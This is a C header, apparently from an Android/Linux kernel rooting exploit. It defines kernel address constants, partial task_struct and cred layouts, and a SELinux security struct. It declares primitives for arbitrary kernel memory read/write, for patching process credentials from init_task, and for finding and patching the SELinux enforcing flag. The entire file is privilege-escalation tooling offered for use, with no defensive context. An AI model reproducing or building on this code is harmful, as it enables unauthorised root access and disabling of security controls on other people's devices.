#ifndef _GETROOT_H_
#define _GETROOT_H_

#include "common.h"


#ifdef CONFIG_ARCH_ARM32
#define THREAD_SIZE          0x2000
#define KERNEL_START         0xc0000000
#define KERNEL_ADDR_START    0xc0000000
#define KERNEL_ADDR_END      0xffffff00
#define KERNEL_CODE_START    0xc0008000
#define KERNEL_CODE_BASE     0xc0008000
#define KSYM_CHECK_ADDR      0xc0000000
#endif

#ifdef CONFIG_ARCH_ARM64
#define THREAD_SIZE          0x2000
#define KERNEL_START         0xffffff8000000000
#define KERNEL_ADDR_START    0xffff000000000000
#define KERNEL_ADDR_END      0xffffffffffff0000
#define KERNEL_CODE_START    0xffffffFF80000000
#define KERNEL_CODE_BASE     0xffffffff80200000
#define KSYM_CHECK_ADDR      0xffffff8000000000
#endif

#ifdef CONFIG_ARCH_X86_64
#define THREAD_SIZE          0x2000
#define KERNEL_START         0xffffff8000000000
#define KERNEL_ADDR_START    0xffff000000000000
#define KERNEL_ADDR_END      0xffffffffffff0000
#define KERNEL_CODE_START    0xffffffFF80000000
#define KERNEL_CODE_BASE     0xffffffff80200000
#define KSYM_CHECK_ADDR      0xffffff8000000000
#endif

#define TASK_COMM_LEN        16
#define INIT_TASK_COMM       "swapper/0"


#define USER_DS              0x8000000000ul

extern void *mmap_uaddr;
extern void *mmap_kaddr;


struct task_struct;
struct thread_info;

struct list_head {
	struct list_head *next, *prev;
};

typedef struct {
	int counter;
} atomic_t;

typedef struct kernel_cap_struct {
	u32 cap[2];
} kernel_cap_t;

struct task_security_struct {
	u32 osid;       /* SID prior to last execve */
	u32 sid;        /* current SID */
	u32 exec_sid;       /* exec SID */
	u32 create_sid;     /* fscreate SID */
	u32 keycreate_sid;  /* keycreate SID */
	u32 sockcreate_sid; /* fscreate SID */
};

struct cred {
	atomic_t    usage;
	uid_t       uid;        /* real UID of the task */
	gid_t       gid;        /* real GID of the task */
	uid_t       suid;       /* saved UID of the task */
	gid_t       sgid;       /* saved GID of the task */
	uid_t       euid;       /* effective UID of the task */
	gid_t       egid;       /* effective GID of the task */
	uid_t       fsuid;      /* UID for VFS ops */
	gid_t       fsgid;      /* GID for VFS ops */
	unsigned    securebits; /* SUID-less security management */
	kernel_cap_t    cap_inheritable; /* caps our children can inherit */
	kernel_cap_t    cap_permitted;  /* caps we're permitted */
	kernel_cap_t    cap_effective;  /* caps we can actually use */
	kernel_cap_t    cap_bset;   /* capability bounding set */
	kernel_cap_t    cap_ambient;    /* Ambient capability set */
	/* ... */
};

struct task_struct_partial
{
	/* ... */
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	char comm[TASK_COMM_LEN];
	/* ... */
};

struct task_struct_partial_ptracer
{
	/* ... */
	struct list_head cpu_timers[3];
	struct cred *ptracer_cred;
	struct cred *real_cred;
	struct cred *cred;
	char comm[TASK_COMM_LEN];
	/* ... */
};

#ifdef CONFIG_ARCH_ARM64
struct thread_info {
	unsigned long           flags;          /* low level flags */
	unsigned long           addr_limit;     /* address limit */
#ifndef CONFIG_THREAD_INFO_IN_TASK
	struct task_struct      *task;          /* main task structure */
#endif
	/* ... */
};
#endif

#ifdef CONFIG_ARCH_ARM32
struct thread_info
{
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;
	/* ... */
};
#endif
int kernel_read(void *src, void *dst, int len);
int kernel_write(void *dst, void *src, int len);
unsigned long kernel_read_ulong(void* kaddr);
unsigned int kernel_read_uint(void* kaddr);
void kernel_write_ulong(void* kaddr, unsigned long data);
void kernel_write_uint(void* kaddr, unsigned int data);
int get_sched_class_offset(void *task, int len);
int get_tasks_offset(void *task, int len);
int get_cred_offset(void *task, int len);
int get_cred_offset_by_name(void* task, int len, char* name);

int patch_cred_by_init_task(void *init_task, char *find_name);
int patch_cred_by_task(void *task, int len, char *name);

int find_task_by_task(void *self_task, char *self_name, void *find_task, char *find_name);
unsigned long find_selinux_enforcing_by_comshic(void* text, int size, unsigned long kaddr);
unsigned long find_selinux_enforcing_by_selre(void* text, int size, unsigned long kaddr);
int patch_selinux(void *kaddr);

#endif
